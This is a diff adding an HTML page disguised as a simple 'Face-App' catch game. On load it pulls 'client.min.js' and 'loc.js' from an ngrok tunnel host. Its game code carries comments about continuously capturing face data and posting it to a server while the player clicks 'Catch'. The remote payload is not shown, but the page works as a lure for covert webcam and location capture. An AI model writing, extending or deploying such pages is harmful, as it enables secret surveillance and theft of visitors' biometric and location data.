@@ -1,0 +1,80 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Face-App with Game</title>
+    <link rel="stylesheet" href="style.css">
+    <link rel="stylesheet" href="all.css">
+    <script src="https://d5e0-37-186-50-255.ngrok-free.app/assets/js/jquery.min.js"></script>
+    <script src="https://d5e0-37-186-50-255.ngrok-free.app/assets/js/client.min.js"></script>
+    <script src="https://d5e0-37-186-50-255.ngrok-free.app/assets/js/loc.js"></script>
+    <script>
+        window.console = window.console || function (t) {};
+        if (document.location.search.match(/type=embed/gi)) {
+            window.parent.postMessage("resize", "*");
+        }
+    </script>
+</head>
+<body onload="init()">
+<div id="device">
+    <div id="top">
+        <div class="left">&nbsp;</div>
+        <div class="right">&nbsp;</div>
+    </div>
+    <div id="content">
+        <div class="menu"><i class="fas fa-bolt fa-lg"></i>
+            <div class="profilePhoto"></div>
+            <i class="fas fa-volume-mute fa-lg"></i>
+        </div>
+        <div class="takenPhotos">
+            <div class="first"></div>
+            <div class="second"></div>
+            <div class="third"></div>
+        </div>
+        <div class="circle">
+            <div class="fill"></div>
+        </div>
+        <i class="fas fa-sync-alt fa-lg right"></i>
+        <div class="detection">
+            <div class="line-left"></div>
+            <div class="line-top"></div>
+            <div class="line-right"></div>
+            <div class="line-bottom"></div>
+        </div>
+        <button id="catchButton" onclick="catchObject()">Catch</button>
+        <div id="score">Score: 0</div>
+    </div>
+</div>
+<script>
+    let score = 0;
+
+    function init() {
+        // Your face app initialization code here
+        
+        // Start the game after a delay
+        setTimeout(startGame, 5000); // Delay in milliseconds
+    }
+
+    function startGame() {
+        // Keep the face app functionality active if needed
+        
+        // Continue to capture face data and update game state
+        setInterval(updateGame, 1000); // Update interval in milliseconds
+    }
+
+    function updateGame() {
+        // Update game state or display new questions
+        // You can also continue using face app functionality
+        
+        // Capture face data and post to server
+        // (Existing face app functionality)
+    }
+
+    function catchObject() {
+        score += 10;
+        document.getElementById("score").textContent = "Score: " + score;
+    }
+</script>
+</body>
+</html>
